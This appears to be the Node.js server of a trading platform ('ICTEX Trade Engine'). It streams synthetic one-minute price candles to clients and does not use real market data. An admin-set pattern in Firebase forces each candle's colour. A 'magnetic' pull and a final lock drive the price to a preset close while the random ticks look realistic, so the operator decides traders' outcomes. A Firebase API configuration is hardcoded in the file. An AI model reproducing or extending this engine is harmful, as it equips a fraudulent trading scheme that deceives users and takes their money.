const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000; // 1 Minute
const TICK_MS = 300;     // Update every 300ms
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminPatterns = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Admin Control Listener ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
        if (fbMarkets[marketId]?.pattern_config?.isActive) {
            adminPatterns[marketId] = fbMarkets[marketId].pattern_config;
        } else {
            delete adminPatterns[marketId];
        }
    });
});

function generateHistoricalCandle(timestamp, open) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    return {
        timestamp,
        open: roundPrice(safeOpen),
        high: roundPrice(Math.max(safeOpen, close) + upperWick),
        low: roundPrice(Math.min(safeOpen, close) - lowerWick),
        close: roundPrice(close)
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles =[];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        candleStartTime: 0,
        targetClose: null,   // Target price for the end of the minute
        targetColor: null    // 'GREEN' or 'RED'
    };
}

// 🔥 Core Engine: Setup Target for the New Minute
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        marketData.candleStartTime = currentPeriod;
        let adminColor = null;
        const adminPattern = adminPatterns[marketData.marketId];

        // Check if Admin set a pattern
        if (adminPattern && currentPeriod >= adminPattern.startTime) {
            const patternIndex = Math.floor((currentPeriod - adminPattern.startTime) / TIMEFRAME);
            if (patternIndex >= 0 && patternIndex < adminPattern.pattern.length) {
                adminColor = adminPattern.pattern[patternIndex]; // 'GREEN' or 'RED'
                console.log(`[ADMIN CONTROL] Market: ${marketData.marketId} | Forced to: ${adminColor}`);
            }
        }

        // Randomly pick color if admin didn't set one
        if (!adminColor) {
            adminColor = Math.random() > 0.5 ? 'GREEN' : 'RED';
        }

        // Set the PERFECT Target Close Price
        const openPrice = lastCandle.close;
        const bodySize = openPrice * (0.0001 + Math.random() * 0.00015);
        
        marketData.targetColor = adminColor;
        if (adminColor === 'GREEN' || adminColor === 'UP') {
            marketData.targetClose = openPrice + bodySize;
        } else {
            marketData.targetClose = openPrice - bodySize;
        }

        // Create the initial shell for the new candle
        const newCandle = {
            timestamp: currentPeriod,
            open: roundPrice(openPrice),
            high: roundPrice(openPrice),
            low: roundPrice(openPrice),
            close: roundPrice(openPrice)
        };

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        return newCandle;
    }
    return lastCandle;
}

// 🔥 The "Magnetic" Price Algorithm
function updateRealisticPrice(marketData, candle) {
    const now = Date.now();
    const elapsedMs = now - marketData.candleStartTime;
    const progress = Math.min(elapsedMs / TIMEFRAME, 1.0); // 0.0 to 1.0 (0 to 60 seconds)

    const openPrice = candle.open;
    const baseVolatility = openPrice * 0.00004;

    // Normal Random Movement
    let tickMove = (Math.random() - 0.5) * baseVolatility * 2;

    // 🎯 Magnetic Pull Logic
    if (progress > 0.65) { 
        // In the last 35% of the minute (after 39 seconds), start pulling towards the target
        const distanceToTarget = marketData.targetClose - marketData.currentPrice;
        // The closer to 60 seconds, the stronger the pull
        const pullStrength = (progress - 0.65) / 0.35; 
        
        tickMove += (distanceToTarget * pullStrength * 0.15);
    }

    // 🔒 Final Lock (Last 1 second)
    if (progress >= 0.98) {
        marketData.currentPrice = marketData.targetClose;
    } else {
        marketData.currentPrice += tickMove;
    }

    // Update Candle Data
    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close));
    candle.low = roundPrice(Math.min(candle.low, candle.close));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// Main High-Frequency Loop
let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle);
        broadcastCandle(marketId, candle);
    }

    // Backup to Firebase once per minute (for UI persistence if server restarts)
    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = {
                    price: lastC.close,
                    timestamp: lastC.timestamp
                };
            }
        }
        if(Object.keys(batchUpdates).length > 0) {
            db.ref().update(batchUpdates).catch(()=>{});
            console.log(`[Batch Sync] ${Object.keys(markets).length} markets backed up to Firebase.`);
        }
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('ICTEX Trade Engine V22 - Magnetic Algorithm Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Engine running on ${PORT}`));